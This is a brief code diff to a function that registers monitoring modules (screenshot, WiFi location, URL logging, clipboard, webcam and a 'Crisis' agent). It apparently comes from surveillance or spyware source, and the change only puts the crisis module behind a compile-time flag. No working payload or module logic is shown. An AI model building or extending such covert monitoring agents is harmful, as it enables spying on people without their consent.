@@ -437,7 +437,9 @@ void InitAgents()
 	PM_SnapShotRegister();
 	PM_WiFiLocationRegister();
 	//PM_PrintAgentRegister();
+#ifdef __ENABLE_CRISIS_MODULE
 	PM_CrisisAgentRegister();
+#endif
 	PM_UrlLogRegister();
 	PM_ClipBoardRegister();
 	PM_WebCamRegister();
